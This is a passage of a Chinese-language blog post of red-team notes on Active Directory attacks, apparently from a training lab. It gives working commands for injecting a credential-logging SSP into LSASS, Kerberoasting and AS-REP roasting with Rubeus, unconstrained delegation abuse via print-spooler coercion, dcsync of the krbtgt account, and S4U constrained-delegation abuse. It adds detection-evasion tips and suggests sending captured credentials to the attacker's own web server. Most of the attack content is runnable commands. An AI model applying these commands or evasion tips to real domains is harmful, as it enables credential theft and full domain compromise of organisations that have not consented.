<p>微软的ssp有：</p>
<ul>
<li>NTLM</li>
<li>Kerberos</li>
<li>Wdgiest</li>
<li>CredSSP</li>
</ul>
<p>如果对DC，以及其他机器有着管理权限，则可以为其注入自定义ssp。</p>
<p>比如mimikatz的ssp的dll，是将用户的明文凭证记录到一个日志中。</p>
<h4 id="1-利用方式"><a href="#1-利用方式" class="headerlink" title="1.利用方式"></a>1.利用方式</h4><p>1.把mimilib.dll放到主机 <code>/system32</code> 目录下后，修改注册表加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSconfig\ -Name &#x27;Security Packages&#x27;| select -ExpandProperty &#x27;Security Packages&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$packages += &quot;mimilib&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSconfig\  -Name &#x27;Security Packages&#x27; -Value $packages</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name &#x27;Security Packages&#x27; -Value $packages</span><br></pre></td></tr></table></figure>

<p>2.直接用mimiktaz注入lsass （要注意这种方式在 winserver 2019和2022并不稳定）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="literal">-Command</span> <span class="string">&#x27;&quot;msic::memssp&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上述两种方式的log位置是 <code>C:\Windows\system32\mimilsa.log</code> </p>
<p>因为在dc上注入ssp要用域管理员权限，而访问他默认的log存储位置也需要管理权限，所以建议是对dll进一步修改，比如将获取到的凭证传输到自己的web服务器上之类，应当避免权限维持却还要需要再次利用高权的情况。</p>
<h3 id="8-kerberoasting"><a href="#8-kerberoasting" class="headerlink" title="8.kerberoasting"></a>8.kerberoasting</h3><p>这里严格来说分为两种，一种是用户预认证没关 <code>as-rep</code> 返回给的由用户密码加密的blob，还有一种是SPN是 <code>TGS-rep</code> 返还的服务st，两者一个是用用户的密码加密，一个是用服务账户的密码加密，所以可以通过字典来对票据爆破，能解密成功就代表拿到了对应的密码。</p>
<p>要注意的是，即便是受保护的用户或组，按道理不会使用aes加密，但却还是能允许被请求加密降级到RC4加密。</p>
<p>如果拿到hash之后跑john或者hashcat提示hash有问题，可以看下是不是有端口和特殊符号之类的手动去除一下。</p>
<h4 id="1-SPN"><a href="#1-SPN" class="headerlink" title="1.SPN"></a>1.SPN</h4><p>在进行kerberosating的过程中，应该注意避免同一时间对所有服务进行大批量请求，mdi将会检测到这种行为，或者发起请求加密降级也同样会触发告警。</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>筛选服务账户</p>
<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;null&quot;</span>&#125; <span class="literal">-Properties</span> servicePrincipalName</span><br></pre></td></tr></table></figure>

<p>Powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianUser</span> <span class="literal">-SPN</span></span><br></pre></td></tr></table></figure>

<p>Rubeus</p>
<p>列出kerberoast可用统计</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /stats</span><br></pre></td></tr></table></figure>

<p>请求目标st</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /user:svcadmin /simple</span><br></pre></td></tr></table></figure>

<hr>
<p>为了避免 <a target="_blank" rel="noopener" href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/downgrade-attack/">加密降级检测</a> 还可以手动指定仅列出支持rc4算法的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /stats /rc4opsec </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec</span><br></pre></td></tr></table></figure>

<hr>
<p>如果没需求，可以直接请求获取所有spn的，输出到文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt</span><br></pre></td></tr></table></figure>
<hr>
<p>如果对一个账户有genricwrite权限或者别的能够编辑添加用户ldap属性的权限，则可以给一个账户配置一个SPN，这样就可以对他发起 <code>kerberoast</code></p>
<p>获取对于高价值用户的ACl</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingDomianAcl</span> <span class="literal">-ResolveGUIDs</span> | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="operator">-match</span> <span class="string">&quot;RDPusers&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>查看账户是否配置了SPN</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianUser</span> <span class="literal">-Identity</span> supportuser |<span class="built_in">select</span> ServicePrincipalname</span><br></pre></td></tr></table></figure>

<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Identity</span> supportuser <span class="literal">-Properties</span> ServicePrincipalName |<span class="built_in">select</span> ServicePrincipalName</span><br></pre></td></tr></table></figure>

<p>没配的话给他配一下(注意在一个forest中，spn名必须是唯一的)</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomianObject</span> <span class="literal">-Identity</span> supportuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;servicePrincipalname=<span class="string">&#x27;dcorp/whateverXD&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> supportuser <span class="literal">-ServicePrincipalNames</span> <span class="selector-tag">@</span>&#123;Add=<span class="string">&quot;dcorp/whatever&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-AS-REProast"><a href="#2-AS-REProast" class="headerlink" title="2.AS-REProast"></a>2.AS-REProast</h4><p>由于一个账户关闭了预认证，所以以这个账户身份与dc发起 <code>as-req</code> 时，dc将会返回一个以用户的密码加密的blob。</p>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p>获取域中没有开启预认证的账户。</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Domainuser</span> <span class="literal">-PreauthNotRequired</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;DoesNotRequirePreAuth <span class="operator">-eq</span> <span class="variable">$True</span>&#125; <span class="literal">-Properties</span> DoesNotRequirePreAuth </span><br></pre></td></tr></table></figure>

<hr>
<p>查询高价值ACL，如果对某个用户的UAC有修改权限，则可以帮他关闭预认证，然后roast尝试跑他的密码</p>
<p>比如这里筛选身份为 <code>RDPusers</code> 的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingDomianAcl</span> <span class="literal">-ResolveGUIDs</span> | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="operator">-match</span> <span class="string">&quot;RDPusers&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>然后找到一个，关闭它的预认证</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomianObject</span> <span class="literal">-Identity</span> Control1User <span class="operator">-XOR</span> <span class="selector-tag">@</span>&#123;useraccountcontrol=<span class="number">4194304</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取域内没有开启预认证的账户，便能看到这个用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianUser</span> <span class="literal">-PreAuthNotRequired</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<hr>
<p>获取关闭预认证账户的blob</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /user:VPN1user /outfile:C:\windows\outfile.txt</span><br></pre></td></tr></table></figure>

<p>同样的，如果要获取所有的就不指定，但是要注意快速获取尝试所有用户的blob也同样会被检测到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast </span><br></pre></td></tr></table></figure>

<p>然后跑就完事了</p>
<hr>
<h3 id="9-Kerberos-Delegation-（委派）"><a href="#9-Kerberos-Delegation-（委派）" class="headerlink" title="9.Kerberos Delegation （委派）"></a>9.Kerberos Delegation （委派）</h3><blockquote>
<p>重复使用用户的凭据来访问托管在不同服务器上的资源。</p>
</blockquote>
<p>比较常见的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户-&gt;web服务器-&gt;数据库</span><br></pre></td></tr></table></figure>

<p>只需要在web服务器提供一次用户自己凭证，后续当用户通过web服务器执行需要鉴权的数据库查询或其他需要凭证才能访问的服务时，web服务器会将一开始获取到的用户凭证提供给后端服务。</p>
<p>委托的目的就是模拟用户</p>
<h4 id="1-无约束委派-Unconstrained-Delegation"><a href="#1-无约束委派-Unconstrained-Delegation" class="headerlink" title="1.无约束委派 Unconstrained Delegation"></a>1.无约束委派 Unconstrained Delegation</h4><p>流程如下</p>
<ul>
<li>1.用户发送凭证给DC</li>
<li>2.DC返回TGT</li>
<li>3.用户向DC请求 webserver 的TGS</li>
<li>4.DC提供一个TGS</li>
<li>5.用户拿着自己的TGT和TGS都发送给webserver </li>
<li>6.webserver为了访问后端，用用户的TGT向DC请求访问sqlserver的TGS</li>
<li>7.webserver拿到TGS，以用户身份请求sqlserver.</li>
</ul>
<p>第6步DC唯一验证TGT有没有效的方式是看Kdc能不能正常解密它。</p>
<p>这无约束委派的流程中里有几个可利用点，首先是第3步 <code>用户会把自己的TGT发送给服务</code>，这代表如果有一个攻击者伪造的服务，用户与伪造服务进行非约束委派时会把自己TGT发送过去。</p>
<h5 id="1-枚举"><a href="#1-枚举" class="headerlink" title="1.枚举"></a>1.枚举</h5><p>枚举域内存在的非约束委派</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Domiancomputer</span> <span class="literal">-unConstrained</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> &#123;TrustedForDelegation <span class="operator">-eq</span> <span class="variable">$True</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;TrustedForDelegation <span class="operator">-eq</span> <span class="variable">$True</span>&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h5><p>正常情况下需要等待用户对存在非约束委派的机器发起请求，然后再上去导出用户发送的票据。</p>
<p>Safetykatz</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::tickets /export&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入票据到当前进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;kerberos::ptt C:\users\appadmin\Documents\user1\[0;2ceb8b31-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>但是一直等也不太现实，所以可以采用强制请求的方式，截至2025年，目前有以下几种方式</p>
<table>
<thead>
<tr>
<th>Protocol</th>
<th>Service</th>
<th>Default on Server Os</th>
<th>Ports Required</th>
</tr>
</thead>
<tbody><tr>
<td>MS-RPRN</td>
<td>Print Spooler</td>
<td>YES</td>
<td>445 (SMB)</td>
</tr>
<tr>
<td>MS-WSP</td>
<td>Windows Search</td>
<td>No(default on clientOS)</td>
<td>445 (SMB)</td>
</tr>
<tr>
<td>MS-DFSNM(MDI detects this)</td>
<td>DFS Namespaces</td>
<td>No</td>
<td>445 (SMB)</td>
</tr>
</tbody></table>
<p>（其实还有小河马）</p>
<p>在实验lab中，dcorp-appsrv启用了非约束委派，所以可以利用它来做。</p>
<p>首先在dcorp-appsrv机器上起一个监听，（注意需要有本地管理员权限才可以）。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">5</span> /nowrap</span><br></pre></td></tr></table></figure>

<p>因为这里仅关注DC机器，所以指定targetuser</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:<span class="number">5</span> /targetuser:DCORP<span class="literal">-DC</span><span class="variable">$</span> /nowrap </span><br></pre></td></tr></table></figure>


<p>然后使用 <code>MS-RPRN.exe</code> 强制域控 <code>dcorp-dc</code>对主机 <code>dcorp-appsrv</code> 发送请求</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS<span class="literal">-RPRN</span>.exe \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local \\dcorp<span class="literal">-appsrv</span>.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>之后Rubeus的监控将会base64的TGT，将其导出，到本地注入到进程中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:xxx</span><br></pre></td></tr></table></figure>

<p>之后便可以用域控主机乱搞，比如dcsync拿krbtgt的aeskey做金票或钻石票之类等等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;lsadump::dcsync /user:krbtgt&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-约束委派-Constrained-Delegation"><a href="#2-约束委派-Constrained-Delegation" class="headerlink" title="2.约束委派 Constrained Delegation"></a>2.约束委派 Constrained Delegation</h4><p>约束委派在2008年引入</p>
<p>目的其一，是为了解决用户端使用非kerberos协议与前端webserver进行身份认证（比如表单认证等），webserver会将收到的表单认证等，转换为kerberos协议以方便与后端的服务交互。</p>
<p>目的其二，与 <code>非约束委派</code> 场景下允许用户从任何服务做第一跳，然后第一跳的服务替用户向任何服务发起第二跳的委派不同。</p>
<p>约束委派仅允许用户从指定的第一跳的服务（UAC位有TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION）上发起第二跳，而且第二跳的范围受第一跳服务的访问服务范围限制，第二跳仅允许访问指定服务器上指定的服务资源。  </p>
<p>同时在这个阶段，为了支持约束委派引入了两个新的拓展协议 <code>S4U2Self</code> 和 <code>S4U2Proxy</code></p>
<h5 id="S4U2Self"><a href="#S4U2Self" class="headerlink" title="S4U2Self"></a>S4U2Self</h5><p>webserver（前端）服务替用户向dc请求一张由用户访问服务自身的<strong>可转发票据</strong>，DC检查当前服务账户的UAC是否有<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 位，然后检查被模拟的用户账户是否被允许委派，如果两者皆都满足则返回票据，<strong>注意，服务以用户身份向dc请求访问到自身票据时不需要提供任何用户凭证</strong>，仅需告知DC发起请求的用户即可。</p>
<p><strong>可利用点：</strong></p>
<ul>
<li>如果一个有<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 位的服务账户被控制，那将可以通过S4U2Self获取到域内任何人（在域内账户都被允许发起委派的情况下）访问到自己的可转发票据，然后再通过S4U2proxy获取到以用户身份访问到第二跳服务账户的票据。</li>
</ul>
<h5 id="S4U4Proxy"><a href="#S4U4Proxy" class="headerlink" title="S4U4Proxy"></a>S4U4Proxy</h5><p>webserver服务使用刚S4U2Self获取的可转发票据，向DC请求一张访问后端服务的票据，DC将检查当前服务的 <code>msDS-AllowedToDelegateTo</code> 字段，如果字段中指向当前要获取的后端服务，则返回一张访问后端服务的票据，现在webserver能以用户身份访问后端。</p>
<p><strong>可利用点：</strong></p>
<ul>
<li>如果<strong>有能力修改当前账户 <code>msDS-AllowedToDelegateTo</code> 字段内的SPN</strong>，则可以自定义该字段，实现向任何带有SPN的机器发起委派请求，也就是说可以访问到域内任何有SPN的机器的任何服务。</li>
</ul>
<h5 id="1-寻找启用了约束委派的用户或机器"><a href="#1-寻找启用了约束委派的用户或机器" class="headerlink" title="1.寻找启用了约束委派的用户或机器"></a>1.寻找启用了约束委派的用户或机器</h5><p>查询开启约束委派的用户</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianUser</span> <span class="literal">-TrustedToAuth</span></span><br></pre></td></tr></table></figure>

<p>查询开启约束委派的机器</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianComputer</span> <span class="literal">-TrustToAuth</span></span><br></pre></td></tr></table></figure>
<hr>
<p>查询所有 <code>ms-AllowedToDelegateTo</code> 不为空的账户</p>
<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObejct</span> <span class="literal">-Filter</span> &#123;ms<span class="literal">-AllowedToDelegateTo</span> <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span> &#125; <span class="literal">-Properties</span> ms<span class="literal">-AllowedToDelegateTo</span></span><br></pre></td></tr></table></figure>

<h5 id="2-利用-S4U2Self-S4U2Proxy-访问服务"><a href="#2-利用-S4U2Self-S4U2Proxy-访问服务" class="headerlink" title="2.利用 S4U2Self + S4U2Proxy 访问服务"></a>2.利用 S4U2Self + S4U2Proxy 访问服务</h5><p>模拟目标账户通过<code>S4U2Self + S4U2Proxy</code>获取可委派服务<code>(ms-AllowedToDelegateTo)</code>的票据 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:websvc /aes256:xxxxxxxx /impersonateuser:Administrator /msdsspn:CIFS/dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<p>现在可以用被注入票据的进程，发起对的目标访问</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> \\dcorp<span class="literal">-mssql</span>.dollarcorp.moneycorp.local\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<h5 id="3-服务器名称不变-通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务"><a href="#3-服务器名称不变-通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务" class="headerlink" title="3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务"></a>3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</h5><p><a target="_blank" rel="noopener" href="https://twitter.com/agsolino">Alberto Solino’s</a>发现，在一张KrbCred(krb凭据)中，只有服务器名是受是加密校验保护的，凭证中的服务名可以随意修改，所以只要目标服务器对应的 SPN 被授权了，就通过修改票据的服务名的字段使用这张票访问目标服务器原本不该访问的资源。</p>
<p>这里用原本只允许当前服务委派DC的 <code>time</code> SPN，但是对面DC开放了 <code>ldap</code>的SPN ，就可以修改S4U2Proxy回来票据中的 <code>time</code> 改为 <code>ldap</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:dcorp<span class="literal">-adminsrv</span><span class="variable">$</span> /aes256:xxxxxxxxx /impersonateuser:Administrator /msdsspn:time/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /altservice:ldap /ptt </span><br></pre></td></tr></table></figure>

<h5 id="4-利用-S4U2Self-伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务"><a href="#4-利用-S4U2Self-伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务" class="headerlink" title="4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务"></a>4. <del>利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</del></h5><p>其实是写的时候想到的，查了下有类似的，不过我还没试过。。等之后尝试ok了再写这部分</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://exploit.ph/revisiting-delegate-2-thyself.html">https://exploit.ph/revisiting-delegate-2-thyself.html</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /user:websvc /aes256:xxxxxxxx /impersonateuser:Administrator /msdsspn:xxxx/websvc.dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<h4 id="3-基于资源的约束委派-RBCD"><a href="#3-基于资源的约束委派-RBCD" class="headerlink" title="3.基于资源的约束委派 RBCD"></a>3.基于资源的约束委派 RBCD</h4><p>在约束委派中，只有DA或有权限的对象才能编辑服务账户 <code>msDS-AllowedToDelegateTo</code> 属性，DC验证当前发起委派服务账户的 <code>msDS-AllowedToDelegateTo</code> 属性是否包含当前要委派至的目标服务.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派服务账户 （ms-AllowedToDelegateTo:cifs/test.aaa.local） -&gt; s4u2proxy- &gt; 服务/后端服务器 （cifs/test.aaa.local）</span><br></pre></td></tr></table></figure>

<p>而基于资源的约束委派（RBCD）将委派配置权限给到了服务自身，发起端的 <code>msDs-AllowedToDelegatTo</code> 属性不再是必须的，由服务账户或服务管理员自己配置服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性 ，允许哪些服务对自己发起委派，委派至哪个服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派服务账户（svc1） -&gt; s4u2proxy -&gt; 服务账户（msDS-AllowedToActOnBehalfOfOtherIdentity:svc1）</span><br></pre></td></tr></table></figure>

<h5 id="1-利用点"><a href="#1-利用点" class="headerlink" title="1.利用点"></a>1.利用点</h5><p>如果对于一个高价值服务账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 有写入权限</p>
<p>魅写完</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/12/26/Tracks-AD-Authority/"
      title="Tracks-AD-Authority"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-AD-Authority
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/20/Sherlocks-Blizzard-Breakdown/"
      title="【Sherlocks】Blizzard-Breakdown"
     >

    <p class="title-text">
      
        【Sherlocks】Blizzard-Breakdown
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


